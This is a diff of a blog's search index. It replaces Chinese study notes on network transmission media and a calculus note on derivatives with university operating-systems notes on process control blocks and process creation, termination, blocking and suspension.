+<li>进程实体的一部分，拥有描述进程情况及控制进程运行所需的全部信息的记录性数据结构</li>
+<li>使一个在多道程序环境下不能独立运行的程序，成为一个能独立运行的基本单位，一个能与其它进程并发执行的进程</li>
+<li>操作系统<strong>控制和管理</strong>并发执行进程的依据</li>
+<li>进程存在的唯一标志</li>
+<li>常驻内存，且存放于操作系统开辟的专门区域-PCB区</li>
 </ul>
-<h4 id="非导引性-无限">非导引性-无限</h4>
+<h4 id="进程控制块中的信息">进程控制块中的信息</h4>
 <ul>
-<li>无线电</li>
-<li>卫星</li>
-</ul>
-<h3 id="有线">有线</h3>
-<h4 id="同轴电缆">同轴电缆</h4>
+<li>进程标识符
 <ul>
-<li>基带同轴电缆
-<ul>
-<li>50Ω，用于数字传输（屏蔽层为铜）</li>
+<li>内(pid)/外部(进程名)、父/子进程、用户标识符</li>
 </ul></li>
-<li>宽带同轴电缆
+<li>处理器调度信息
 <ul>
-<li>75Ω，用于模拟传输（）屏蔽层为铝</li>
+<li>通用、PC、PSW、用户占指针寄存器</li>
 </ul></li>
-<li>粗缆
+<li>进程调度信息
 <ul>
-<li>最大传输距离500m，两端安装终接器，确保电缆屏蔽层接地</li>
+<li>进程状态、进程优先级(静态优先级，动态优先级)、事件及其他</li>
 </ul></li>
-<li>细缆
+<li>进程控制信息
 <ul>
-<li>最大传输距离为185m，两头按住概念<strong>BNC</strong><a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>头，接在<strong>T型连接器</strong><a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>两端</li>
+<li>程序和数据地址、进程同步通信机制</li>
+<li>资源清单、链接指针、进程图</li>
 </ul></li>
 </ul>
-<h4 id="双绞线">双绞线</h4>
+<h3 id="进程图进程树">进程图（进程树）</h3>
 <ul>
-<li><p>逆时针方向绞合而成</p>
+<li>描述进程家族的有向树
 <ul>
-<li>用于消除近端串扰 Crosstalk<a href="#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a></li>
-<li>绞距越小，越均匀，抵消效果越好，传输性能越好（高类网线和低类网线一个重要区别就是绞距不同<a href="#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a>）</li>
-</ul></li>
-<li><p>非屏蔽双绞线-UTP</p>
-<ul>
-<li>优点</li>
-<li>成本低
-<ul>
-<li>易于安装</li>
-<li>尺寸低</li>
-</ul></li>
-<li>缺点
-<ul>
-<li>易受干扰</li>
-<li>距离性能受到绞距影响</li>
-</ul></li>
-<li>五类双绞线
-<ul>
-<li>提供10-100M的数字带宽，其中两对线分别用于收、发</li>
-<li>1000M以太网中，用到了全部的四对线</li>
-<li>最大传输距离100m，广泛用于局域网</li>
-</ul></li>
-</ul></li>
-<li><p>屏蔽双绞线-STP</p>
-<ul>
-<li>优点
-<ul>
-<li>抗<strong>EMI</strong><a href="#fn5" class="footnote-ref" id="fnref5" role="doc-noteref"><sup>5</sup></a>、<strong>RFI</strong><a href="#fn6" class="footnote-ref" id="fnref6" role="doc-noteref"><sup>6</sup></a>干扰</li>
-</ul></li>
-</ul></li>
-<li><p>缺点 - 成本高</p>
-<ul>
-<li>不易安装</li>
-</ul></li>
-<li><p>加了两层屏蔽层，用于每对线和全部四对线外</p></li>
-<li><p>网屏双绞线-ScTP</p>
-<ul>
-<li>每个线对的屏蔽层去掉</li>
-</ul></li>
-<li><p>线序</p>
-<ul>
-<li>直通线
-<ul>
-<li>不同设备</li>
-</ul></li>
-<li>交叉线
-<ul>
-<li>同种设备</li>
-</ul></li>
+<li>结点/有向边</li>
+<li>父/子进程</li>
+<li>祖先进程/祖先</li>
 </ul></li>
 </ul>
-<p>电力线</p>
+<p>知道进程的子进程有助于在知道父进程的情况下，杀死其子进程</p>
+<p>知道进程的祖先进程有助于当子进程被杀死后通知父进程</p>
+<h3 id="pcb的组织方式">PCB的组织方式</h3>
+<p>执行指针</p>
+<p>就绪队列指针</p>
+<p>阻塞队列指针</p>
+<p>空闲队列指针</p>
 <ul>
-<li>没有普及，未来技术</li>
-</ul>
-<h4 id="光纤">光纤</h4>
+<li>链接方式
 <ul>
-<li>构成
-<ul>
-<li>光导纤维</li>
-<li>玻璃覆盖层</li>
-<li>外层</li>
+<li>通过链表查询队列</li>
 </ul></li>
-<li>原理
+<li>索引方式
 <ul>
-<li>光的全反射
-<ul>
-<li>当光从光密物质射向光疏物质，入射角大于临界角，光发生全反射</li>
-<li>光全锁闭在光密物质中，全反射钱箱</li>
-</ul></li>
-</ul></li>
-<li>优点
-<ul>
-<li>重量轻
-<ul>
-<li>非常细的光导纤维</li>
-</ul></li>
-<li>损耗低</li>
-<li>不受电磁干扰影响</li>
-<li>带宽、容量大</li>
-</ul></li>
-<li>缺点
-<ul>
-<li>昂贵</li>
-<li>易断裂</li>
-</ul></li>
-<li>分类
-<ul>
-<li>单模光纤</li>
-<li>多模光纤</li>
-</ul></li>
-<li>光传输系统构成
-<ul>
-<li>光源</li>
-<li>传输介质</li>
-<li>探测器</li>
-</ul></li>
-<li>修复
-<ul>
-<li>光纤连接器</li>
-<li>机械拼接，直接使用套管夹紧 10%损耗</li>
-<li>熔合 无损耗</li>
+<li>建立索引表用于查询队列</li>
 </ul></li>
 </ul>
-<section class="footnotes" role="doc-endnotes">
-<hr />
-<ol>
-<li id="fn1" role="doc-endnote"><p>BNC接头是监控工程中用于摄像设备输出时导线和摄像机的连接头。<a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
-<li id="fn2" role="doc-endnote"><p>一个同轴结构的端处分成三个方向，外形成“T”形的高频的连接器。<a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
-<li id="fn3" role="doc-endnote"><p>串扰在电子学上是指两条信号线之间的耦合现象。这是因为空间距离近的信号线之间会出现不希望的电感性和电容性耦合从而互相干扰。电容性耦合会引发耦合电流，而电感性耦合则引发耦合电压<a href="#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
-<li id="fn4" role="doc-endnote"><img src="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC%E4%B8%89%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%89%A9%E7%90%86%E5%B1%82/%E8%B6%85%E4%BA%94%E7%B1%BB%E7%BA%BF%E5%92%8C%E5%85%AD%E7%B1%BB%E7%BA%BF.png" class="" title="超五类线和六类线">
-<a href="#fnref4" class="footnote-back" role="doc-backlink">↩︎</a></li>
-<li id="fn5" role="doc-endnote"><p>电磁干扰：Electromagnetic Interference-电磁干扰是指电子产品工作会对周边的其他电子产品造成干扰<a href="#fnref5" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
-<li id="fn6" role="doc-endnote"><p>射频干扰： Radio Frequency Interference-射频干扰是在接收机所接收的信号频率或非常接近此频率处产生的干扰<a href="#fnref6" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
+<h2 id="进程的创建与终止">进程的创建与终止</h2>
+<h3 id="引起创建进程的事件">引起创建进程的事件</h3>
+<ul>
+<li>用户登录
+<ul>
+<li>分时系统中，验证为合法的终端用户登录</li>
+</ul></li>
+<li>作业调度
+<ul>
+<li>批处理系统中作业调度到某作业</li>
+</ul></li>
+<li>提供服务
+<ul>
+<li>运行中的用户程序提出某种请求</li>
+</ul></li>
+<li>应用请求
+<ul>
+<li>基于用户进程的需要由其自身创建新进程</li>
+</ul></li>
+</ul>
+<h3 id="引起终止进程的事件">引起终止进程的事件</h3>
+<ul>
+<li>正常结束
+<ul>
+<li>批处理系统中的Halt，分时系统中的LogsOff</li>
+</ul></li>
+<li>异常结束
+<ul>
+<li>越界错误、保护错误</li>
+<li>特权指令错误</li>
+<li>非法指令错误</li>
+<li>运行超时、等待超时</li>
+<li>算数运算错、I/O故障</li>
+</ul></li>
+<li>外界干预
+<ul>
+<li>操作员或者操作系统干预
+<ul>
+<li>发送SIGKILL信号强制杀死</li>
+</ul></li>
+<li>父进程请求/终止</li>
+</ul></li>
+</ul>
+<h3 id="进程创建过程">进程创建过程</h3>
+<h4 id="create原语">Create()原语</h4>
+<ol type="1">
+<li>分配标识符，并申请空白进程控制块</li>
+<li>为新进程的程序和数据及用户占分配必要的内存空间
+<ol type="1">
+<li>所需内存大小问题</li>
+</ol></li>
+<li>初始化进程控制快
+<ol type="1">
+<li>自身/父进程标识符</li>
+<li>处理机状态/调度信息</li>
+</ol></li>
+<li>讲新进程插入到就绪队列</li>
 </ol>
-</section>
+<h3 id="进程终止过程">进程终止过程</h3>
+<h4 id="terminate原语">Terminate()原语</h4>
+<ol type="1">
+<li>检索被终止进程PCB，读取其进程状态</li>
+<li>若其正处于执行状态，立即终止执行并设置调度标志为真，来重新调度其他进程</li>
+<li>终止子孙进程</li>
+<li><strong>资源归还</strong>-最重要的过程</li>
+<li>一处被终止进程PCB，等待其他程序查询利用</li>
+</ol>
+<h2 id="进程的阻塞与唤醒">进程的阻塞与唤醒</h2>
+<h3 id="引起进程阻塞的事件">引起进程阻塞的事件</h3>
+<ul>
+<li>请求系统服务
+<ul>
+<li>但不能立刻满足，需要阻塞自己等待系统服务的响应</li>
+</ul></li>
+<li>启动某种操作
+<ul>
+<li>某种动作是本进程下一个动作的前趋，不满足不能向后执行</li>
+</ul></li>
+<li>新数据尚未到达
+<ul>
+<li>相互合作的进程必须先获得另一方的进程数据才能继续</li>
+</ul></li>
+<li>无新工作可做
+<ul>
+<li>特定功能的系统进程当完成任务且当前暂无任务</li>
+</ul></li>
+</ul>
+<h3 id="引起进程唤醒的事件">引起进程唤醒的事件</h3>
+<ul>
+<li>系统服务满足</li>
+<li>操作完成</li>
+<li>数据到达</li>
+<li>新任务出现</li>
+</ul>
+<h3 id="进程阻塞过程">进程阻塞过程</h3>
+<h4 id="block原语">Block()原语</h4>
+<ol type="1">
+<li>先立即停止执行，把进程控制块中的现行状态由执行状态改为阻塞状态，并将它插入到对应的阻塞队列中</li>
+<li>转调度程序进程重新调度，将处理机分配给另一就绪进程，并进行切换</li>
+</ol>
+<h3 id="进程唤醒过程">进程唤醒过程</h3>
+<h4 id="wakeup原语">Wakeup()原语</h4>
+<p>首先把阻塞进程从等待该事件的阻塞进程队列中移出，将其PCB中的现行状态由阻塞改为就绪，并插入到就绪队列中</p>
+<h2 id="进程的挂起与激活">进程的挂起与激活</h2>
+<h3 id="进程挂起过程">进程挂起过程</h3>
+<h4 id="suspend过程">Suspend()过程</h4>
+<ol type="1">
+<li>检查被挂起进程的状态并修改和插入到对应队列</li>
+<li>复制PCB到指定域</li>
+<li>若被挂进程正在执行则转向调度程序重新调度</li>
+</ol>
+<h3 id="进程激活过程">进程激活过程</h3>
+<h4 id="activate原语">Activate()原语</h4>
+<ol type="1">
+<li>检查进程现行状态并修改和插队</li>
+<li>若有新进程进入就绪队列并采用了抢占式调度策略，则检查和决定是否重新调度</li>
+</ol>
 ]]></content>
       <categories>
         <category>大学</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>微积分的本质</title>
-    <url>/%E5%BE%AE%E7%A7%AF%E5%88%86%E7%9A%84%E6%9C%AC%E8%B4%A8/</url>
-    <content><![CDATA[<h3 id="导数要看做某一点附近的变化率而不是某一点的瞬时变化率因为瞬时没有意义">导数要看做某一点附近的变化率,而不是某一点的瞬时变化率,因为瞬时没有意义</h3>
-<ul>
-<li>瞬时是啥,能吃吗? <a id="more"></a> #### 导数完全体 <span class="math display">\[
-\frac{ds}{dt}(t)=\frac{s(t+dt)-s(t)}{dt}
-\]</span></li>
-</ul>
-<h3 id="符号d表明了就是要求d描述的值趋近于0时的结果">符号<span class="math inline">\(d\)</span>表明了就是要求<span class="math inline">\(d\)</span>描述的值趋近于0时的结果</h3>
-<ul>
-<li><span class="math inline">\(dt\)</span>表明<span class="math inline">\(t\)</span>趋近于零</li>
-<li>导数的本质并不是分数,而是当所求变化量越来越小时这个比值的极限</li>
-</ul>
-<h3 id="求一个函数stt3在t2时的导数">求一个函数<span class="math inline">\(s(t)=t^3\)</span>在<span class="math inline">\(t=2\)</span>时的导数</h3>
-<ul>
-<li>先写出导数完全体</li>
-</ul>
-<p><span class="math display">\[
-\frac{ds}{dt}(2)=\frac{s(2+dt)-s(2)}{dt}
-\]</span></p>
-<ul>
-<li><p><span class="math inline">\(\frac{ds}{dt}(2)\)</span>可表示为<span class="math inline">\(\frac{d(2^3)}{dt}\)</span></p></li>
-<li><p>再转换</p></li>
-</ul>
-<p><span class="math display">\[
-\frac{ds}{dt}(2)=\frac{(2+dt)^3-(2)^3}{dt}
-\]</span></p>
-<ul>
-<li>分步乘法</li>
-</ul>
-<p><span class="math display">\[
-\frac{ds}{dt}(2)=\frac{2^3+3(2)^2dt+3(2)(dt)^2+(dt)^3-2^3}{dt}
-\]</span></p>
-<ul>
-<li>化简</li>
-</ul>
-<p><span class="math display">\[
-\frac{ds}{dt}(2)=3(2)^2+3(2)dt+(dt)^2
-\]</span></p>
-<ul>
-<li>因为<span class="math inline">\(dt\)</span>趋近于零,所以任何数乘以<span class="math inline">\(0\)</span>都得零</li>
-</ul>
-<p><span class="math display">\[
-\frac{ds}{dt}(2)=3(2)^2
-\]</span></p>
-<ul>
-<li>得到结果</li>
-</ul>
-<p><span class="math display">\[
-\frac{ds}{dt}(2)=12
-\]</span></p>
-<h4 id="结论学完微积分后的本能想法不必从头推导">结论(学完微积分后的本能想法,不必从头推导)</h4>
-<p><span class="math display">\[
-\frac{ds}{dt}(2)=3(t)^2
-\]</span></p>
-<h3 id="基本的组合函数">基本的组合函数</h3>
-<h4 id="加法法则">加法法则</h4>
-
-<p><strong>口诀:组合函数加法就是先对其中的元素进行求导,再相加</strong></p>
-<img src="/%E5%BE%AE%E7%A7%AF%E5%88%86%E7%9A%84%E6%9C%AC%E8%B4%A8/%E5%8A%A0%E6%B3%95%E6%B3%95%E5%88%99.png" class="" title="[加法法则]">
-<h4 id="乘法法则">乘法法则</h4>
-<h5 id="处理乘积通过面积来思考会更合适">处理乘积通过面积来思考会更合适</h5>
-<img src="/%E5%BE%AE%E7%A7%AF%E5%88%86%E7%9A%84%E6%9C%AC%E8%B4%A8/%E4%B9%98%E6%B3%95%E6%B3%95%E5%88%99-%E7%9B%B4%E8%A7%82.png" class="" title="[乘法法则-直观]">
-<p><strong>口诀:前导后不导,后导前不导</strong></p>
-<img src="/%E5%BE%AE%E7%A7%AF%E5%88%86%E7%9A%84%E6%9C%AC%E8%B4%A8/%E4%B9%98%E6%B3%95%E6%B3%95%E5%88%99.png" class="" title="[乘法法则]">
-<h4 id="链式法则">链式法则</h4>
-<img src="/%E5%BE%AE%E7%A7%AF%E5%88%86%E7%9A%84%E6%9C%AC%E8%B4%A8/%E9%93%BE%E5%BC%8F%E6%B3%95%E5%88%99.png" class="" title="[链式 法则]">
-<h3 id="多元复合函数求导法则">多元复合函数求导法则</h3>
-<p>口诀:<strong>分段用乘, 分叉用加, 单路全导, 叉路偏导</strong></p>
-]]></content>
-      <categories>
-        <category>数学</category>
       </categories>
   </entry>
 </search>
